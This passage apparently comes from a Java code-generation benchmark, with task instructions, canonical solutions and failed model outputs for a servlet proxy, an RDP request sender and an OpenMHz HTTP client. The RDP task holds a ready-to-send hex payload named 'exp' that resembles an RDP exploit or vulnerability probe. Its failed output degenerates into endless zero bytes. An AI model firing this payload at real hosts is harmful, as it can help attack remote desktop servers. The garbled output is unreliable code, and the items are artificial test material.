    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.http.*;\n\npublic class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        Socket socket = new Socket(host, port);\n        try {\n            Writer writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            sendRequest(req, writer);\n            PushbackInputStream strm = new PushbackInputStream(\n                    new BufferedInputStream(socket.getInputStream()));\n            if(getResponseHeader(req, resp, strm))\n                transferResponseBody(resp, strm);\n        } finally {\n            socket.close();\n        }\n    }\n\n    protected void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm)\n            throws ServletException, IOException {\n        OutputStream outs = resp.getOutputStream();\n        int b;\n        while((b = strm.read()) != -1)\n            outs.write(b);\n        outs.flush();\n    }\n\n    protected boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm)\n        throws ServletException, IOException {\n        ArrayList list = readSexpr(strm);\n        return processResponse(req, resp, list);\n    }\n\n    protected void sendRequest(HttpServletRequest req, Writer writer)\n            throws IOException {\n        writer.write(\"(\");\n        writeTagValuePair(writer, \"method\", req.getMethod());\n        writeTagValuePair(writer, \"uri\", req.getRequestURI());\n        writeTagValuePair(writer, \"protocol\", req.getProtocol());\n        writer.write(\")\");\n        writer.flush();\n    }\n\n    protected void writeTagValuePair(Writer writer, String tag, String value)\n            throws IOException {\n        writer.write(\"(\");\n        writer.write(tag);\n        writer.write(\" \");\n        writer.write(\"\\\"\");\n        writer.write(value.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\",\"\\\\\\\\\\\"\"));\n        writer.write(\"\\\"\");\n        writer.write(\")\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.*;\nimport java.net.Socket;\n\npublic class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    public Lisplet(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        try (Socket socket = new Socket(host, port);\n             OutputStream outputStream = socket.getOutputStream();\n             Writer writer = new OutputStreamWriter(outputStream);\n             InputStream inputStream = socket.getInputStream();\n             PushbackInputStream pushbackInputStream = new PushbackInputStream(inputStream)) {\n\n            sendRequest(req, writer);\n\n            if (!getResponseHeader(req, resp, pushbackInputStream)) {\n                return;\n            }\n\n            transferResponseBody(resp, pushbackInputStream);\n        }\n    }\n\n    private void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        byte[] buffer = new byte[4096];\n        int bytesRead;\n        OutputStream out = resp.getOutputStream();\n        while ((bytesRead = strm.read(buffer)) != -1) {\n            out.write(buffer, 0, bytesRead);\n        }\n        out.flush();\n    }\n\n    private boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(strm));\n        String line;\n        while ((line = reader.readLine()) != null && !line.isEmpty()) {\n            int colonIndex = line.indexOf(':');\n            if (colonIndex == -1) {\n                continue;\n            }\n            String headerName = line.substring(0, colonIndex).trim();\n            String headerValue = line.substring(colonIndex + 1).trim();\n            resp.setHeader(headerName, headerValue);\n        }\n        return true;\n    }\n\n    private void sendRequest(HttpServletRequest req, Writer writer) throws IOException {\n        PrintWriter printWriter = new PrintWriter(writer);\n        String method = req.getMethod();\n        String requestURI = req.getRequestURI();\n        String protocol = req.getProtocol();\n\n        printWriter.println(method + \" \" + requestURI + \" \" + protocol);\n\n        for (String headerName : Collections.list(req.getHeaderNames())) {\n            String headerValue = req.getHeader(headerName);\n            writeTagValuePair(writer, headerName, headerValue);\n        }\n\n        printWriter.println();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(req.getInputStream()));\n        char[] buffer = new char[4096];\n        int charsRead;\n        while ((charsRead = reader.read(buffer)) != -1) {\n            writer.write(buffer, 0, charsRead);\n        }\n\n        writer.flush();\n    }\n\n    private void writeTagValuePair(Writer writer, String tag, String value) throws IOException {\n        writer.write(tag);\n        writer.write(\": \");\n        writer.write(value);\n        writer.write(\"\\r\\n\");\n    }\n}\n```"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a Java function that sends a raw RDP (Remote Desktop Protocol) connection request to a specified host and port using TCP socket communication. The function should handle the socket connection, data transmission, and proper resource cleanup.\n\nFunction Description: The function establishes a TCP connection to a specified remote host and port, sends a pre-defined hexadecimal RDP protocol payload, and then closes the connection. The function includes error handling for connection issues and implements a socket timeout to prevent hanging.\n\nInput:\n- rhost: String - The remote host IP address or hostname to connect to\n- rport: int - The remote port number for the RDP service\n\nOutput: None (void function), though errors will be printed to standard error if they occur\n\nNote: The function uses a static hexadecimal string (exp) containing the RDP protocol payload, which is converted to bytes before transmission. The socket timeout is set to 3 milliseconds to prevent prolonged connection attempts.",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic static String exp = \"030000130ee000000000000100080000000000030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c00300000c02f08004010001000300000802f080280300000c02f08038000603ef0300000c02f08038000603eb0300000c02f08038000603ec0300000c02f08038000603ed0300000c02f08038000603ee0300000b06d00000123400\";\n\npublic void sendRDPRequest(String rhost, int rport) {\n    try {\n        byte[] bytes = HexUtils.hex2Bytes(exp);\n        Socket socket = new Socket(rhost, rport);\n        socket.setSoTimeout(3);\n        OutputStream out = socket.getOutputStream();\n        out.write(bytes);\n        out.flush();\n        out.close();\n        socket.close();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class RdpSender {\n    private static final String exp = \"03 00 00 12 0e 17 00 08 02 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 ff ff ff 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0"
  },
  {
    "Task_id": 41,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for interacting with the OpenMHz API, including methods for testing connection authorization and uploading audio recordings with metadata.\n\nClass Description: OpenMHzHttpClient is a utility class that provides HTTP client operations for the OpenMHz API. It handles both synchronous and asynchronous requests, manages connection settings, and processes API responses. The class includes error handling and logging capabilities.\n\nAttributes:\n- mLog: Logger - SLF4J logger instance for error and debug logging\n- mHttpClient: HttpClient - Configured HTTP client instance with HTTP/2 support, redirect policy, and timeout settings\n\nMethods:\n- testConnection(String host, String systemName, String apiKey) -> String - Tests API connection and authorization by sending a POST request to the authorize endpoint. Returns status messages based on response code.\n  Input:\n    - host: String - Base URL of the OpenMHz server\n    - systemName: String - Name of the target system\n    - apiKey: String - API key for authentication\n  Output:\n    - String - Status message (\"OK\", \"Invalid API Key\", \"Invalid System Name\", \"No Response\", or \"Unknown Exception\")\n\n- sendAudioRecording(String uri, byte[] audioBytes, String boundary, String apiKey, long frequency, long timestampSeconds, int durationSeconds, String talkgroup, String radioId) -> void - Asynchronously uploads an audio recording with metadata to the OpenMHz API using multipart/form-data format.\n  Input:\n    - uri: String - Target endpoint URL\n    - audioBytes: byte[] - Audio file data to upload\n    - boundary: String - Multipart boundary string\n    - apiKey: String - API key for authentication\n    - frequency: long - Frequency value in Hz\n    - timestampSeconds: long - Recording start time in seconds\n    - durationSeconds: int - Recording 